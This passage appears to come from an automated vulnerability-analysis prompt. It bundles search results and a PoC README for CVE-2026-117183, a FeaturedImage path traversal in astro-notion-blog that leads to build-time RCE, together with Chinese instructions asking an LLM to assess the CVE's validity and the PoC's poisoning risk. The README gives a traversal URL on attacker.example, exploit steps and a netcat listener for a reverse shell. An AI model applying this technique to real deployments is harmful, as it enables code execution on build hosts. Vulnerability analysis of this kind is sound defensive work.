nd]\n[webpage 1 begin] [title] GitHub - 0xMarcio/pocindex: Search public CVE proof-of-concept exploits ...\n [description] PoC Index: Search public CVE proof-of-concept exploits from GitHub, Nuclei, ExploitDB, Metasploit and Vulhub, with CVSS, EPSS and CISA KEV context. Find exploits by CVE, vendor, product or keyword.\n [link] https://github.com/0xMarcio/pocindex\n [webpage 1 end]\n[webpage 2 begin] [title] CVE-2026-117183: astro-notion-blog Path Traversal | CVETodo\n [description] CVE-2026-117183 is a Path Traversal vulnerability in astro-notion-blog. Full technical analysis, mitigations, and exploit status — updated in real time.\n [link] https://cvetodo.com/cve/CVE-2026-117183\n [webpage 2 end]\n[webpage 3 begin] [title] CVE-2026-117183 - Exploits & Severity - Feedly\n [description] A path traversal vulnerability in the FeaturedImage component of astro-notion-blog 0.13.0 allows attackers to escape the intended directory, as well as read and overwrite files on the server via a crafted URL.\n [link] https://feedly.com/cve/CVE-2026-117183\n [webpage 3 end]\n[webpage 4 begin] [title] Primandito/CVE-2026-117183 — PoC exploit for CVE-2026-117183 | Sploitus\n [description] CVSS 6.4 for CVE-2026-117183 6.4 MEDIUM SEVERITY Version NONE VectorNONE Working code 99%confidence this exploit runs Based on 1 file (s) in the source CVE Information CVE-2026-117183 Exploit Details Modified:2026-10-30 08:59 Last Seen:2026-10-30 09:00 Reporter:Primandito Tags\n [link] https://sploitus.com/exploit?id=DF46D2A6-2C99-59F2-802D-9BA10AA5B9AE\n [webpage 4 end]\n\n            \n        ```\n    *   **漏洞利用代码：**\n        ```\n        /tmp/8ce03843f6a82f81e74caab994f59cdc/README.md\n---\n# CVE-2026-117183 — Build-time RCE via FeaturedImage Path Traversal in astro-notion-blog 0.13.0\n\n![CVE](https://img.shields.io/badge/CVE-2026--117183-red)\n![Version](https://img.shields.io/badge/astro--notion--blog-0.13.0-blue)\n![Status](https://img.shields.io/badge/status-unpatched-red)\n![CVE State](https://img.shields.io/badge/CVE%20state-published-brightgreen)\n\n## Summary\n\n`astro-notion-blog` v0.13.0 is vulnerable to a **Path Traversal** that leads to **Remote Code Execution (RCE)** during the build process. The `downloadFile()` function in `src/lib/notion/client.ts` takes the last segment of a remote image URL, runs it through `decodeURIComponent()`, and appends it to `./public/notion/`. There is no validation to ensure the resulting path stays within that directory.\n\nAn attacker with edit access to the Notion database can set a `FeaturedImage` URL ending in `%2e%2e%2f%2e%2e%2fsrc%2fpages%2findex.astro`. This decodes to `../../src/pages/index.astro`, overwriting a real page. Since the `featured-image-downloader` integration fetches every post's image at `astro:build:start`, the overwritten file (which is a page Astro compiles in the same build) runs the attacker's frontmatter code in Node. This results in command execution as the build user.\n\n| Field | Value |\n|-------|-------|\n| CVE ID | CVE-2026-117183 |\n| Official Record | [cve.org/CVERecord?id=CVE-2026-117183](https://www.cve.org/CVERecord?id=CVE-2026-117183) |\n| Affected Version | astro-notion-blog 0.6.1 to 0.13.0 (Tested: 0.13.0) |\n| Vulnerability Type | CWE-22: Path Traversal -> CWE-94: Code Injection (RCE) |\n| Attack Vector | Network |\n| Privileges Required | Low (Requires edit access to the Notion database) |\n| Affected Component | `src/lib/notion/client.ts` (`downloadFile()`), `src/integrations/featured-image-downloader.ts` |\n| Original Report | [otoyo/astro-notion-blog#255](https://github.com/otoyo/astro-notion-blog/issues/255) |\n\n---\n\n## Affected Files\n\n- `src/lib/notion/client.ts`\n- `src/integrations/featured-image-downloader.ts`\n\n---\n\n## Vulnerable Code\n\nThe root cause is in `src/lib/notion/client.ts:478-486` (tag 0.13.0):\n\n```ts\nconst dir = './public/notion/' + url.pathname.split('/').slice(-2)[0]\nif (!fs.existsSync(dir)) {\n  fs.mkdirSync(dir, { recursive: true })\n}\n\nconst filename = decodeURIComponent(url.pathname.split('/').slice(-1)[0])\nconst filepath = `${dir}/${filename}`\n\nconst writeStream = createWriteStream(filepath)\n```\n\n`url.pathname` keeps percent-encoding, so a `/` inside the last segment is still `%2f`. `decodeURIComponent()` turns it into a real separator, and `filepath` is just string concatenation. No `path.basename`, no `path.resolve`, and no check that the final path is still under `public/notion`.\n\nThe hook that feeds it is in `src/integrations/featured-image-downloader.ts:7-25`:\n\n```ts\n'astro:build:start': async () => {\n  const posts = await getAllPosts()\n\n  await Promise.all(\n    posts.map((post) => {\n      if (!post.FeaturedImage || !post.FeaturedImage.Url) {\n        return Promise.resolve()\n      }\n\n      let url!: URL\n      try {\n        url = new URL(post.FeaturedImage.Url)\n      } catch {\n        console.log('Invalid FeaturedImage URL: ', post.FeaturedImage?.Url)\n        return Promise.resolve()\n      }\n\n      return downloadFile(url)\n    })\n  )\n},\n```\n\n---\n\n## Proof of Concept\n\nA video of the full run and the exploit archive (`f01-poc-exploit.zip`) are attached to the original issue. The following steps outline the order of operations (exact values depend on your workspace):\n\n1. Duplicate the template linked in the project README.\n2. Create a new Notion connection with Read/Insert/Update access and copy the API token.\n3. Connect the duplicated page to the new connection.\n4. Copy the 32-hex database ID from the full page URL (before `?v=`).\n5. Clone the target and install:\n   ```bash\n   git clone --branch 0.13.0 --depth 1 https://github.com/otoyo/astro-notion-blog.git target\n   cd target\n   npm ci\n   ```\n6. Unpack the PoC and run it:\n   ```bash\n   unzip f01-poc-exploit.zip -d f01-poc\n   cd f01-poc\n   chmod +x run-*.sh\n   ./run-interactive.sh\n   ```\n7. Start a `nc -lvnp <port>` listener if using the shell payload (the runner waits for it).\n8. The runner prints checks and leaves evidence in a timestamped directory.\n\n### Path Math\n\nFor `http://attacker.example/%2e%2e%2f%2e%2e%2fsrc%2fpages%2findex.astro`:\n\n```text\npathname                            /%2e%2e%2f%2e%2e%2fsrc%2fpages%2findex.astro\nsplit('/')                          [\"\", \"%2e%2e%2f%2e%2e%2fsrc%2fpages%2findex.astro\"]\nslice(-2)[0]                        \"\"              -> dir = \"./public/notion/\"\nslice(-1)[0]                        \"%2e%2e%2f%2e%2e%2fsrc%2fpages%2findex.astro\"\ndecodeURIComponent(last segment)    \"../../src/pages/index.astro\"\nfilepath                            \"./public/notion//../../src/pages/index.astro\"\nresolved                            \"<repo>/src/pages/index.astro\"\n```\n\n### Why i\n        ```\n\n    **你的角色：** 你是一名专业的网络安全分析师，擅长分析CVE漏洞信息。\n\n    **任务：**\n\n    1.  **CVE有效性：** 分析此CVE是否为真实存在的有效漏洞。请综合考虑CVE编号格式、漏洞描述的完整性、参考链接的存在、漏洞的技术细节等因素。\n    2.  **POC有效性：** 判断提供的POC代码是否有效，是否能实际利用此漏洞，并分析其有效性。\n    3.  **投毒风险：** 分析POC代码内容,判断此仓库中是否存在作者隐藏的投毒代码,分析结果使用百分比。务必不要把POC验证的后门代码判定为投毒代码。\n    4.  **利用方式：** 详细分析并总结漏洞的利用方式，包括攻击步骤、所需条件等。\n    5.  **代码分析：** 详细分析POC代码的工作原理、关键组件和执行流程。\n    6.  **排序优先级:** 搜索引擎结果 >  漏洞利用代码 > 漏洞库信息\n    7.  **输出内容:** 务必使用中文\n    8.  **markdown内容:** 务必使用markdown格式，包含以下部分：\n        - 漏洞概述\n        - 有效性分析\n        - 投毒风险分析\n        - 利用方式\n        - 代码分析\n    **输出格式：**  你**必须**严格按照以下 **JSON** 格式输出，**不要包含任何额外的文字、说明或前缀/后缀**。JSON中的**所有键和字符串类型的值必须使用双引号**。请务必对特殊字符进行转义。\n\n    **示例JSON:**```json\n    {\n        \"name\": \"CVE-2023-12345-ExampleApp-SQL注入\",\n        \"type\": \"SQL注入\",\n        \"app\": \"ExampleApp\", \n        \"risk\": \"高危，可能导致数据泄露和远程代码执行\",\n        \"version\": \"<= 1.0\",\n        \"condition\": \"需要网络访问和数据库端口开放\",\n        \"poc_available\": \"是\",\n        \"poison\": \"90%\",\n        \"cve_valid\": \"是\",\n        \"markdown\": \"# 漏洞概述\n\n该漏洞存在于ExampleApp的登录模块,攻击者可以通过构造恶意的SQL语句绕过身份验证...\n\n## 有效性分析\n\n根据CVE编号格式、漏洞描述的完整性、参考链接的存在等因素，该CVE是真实有效的...\n\n## 投毒风险分析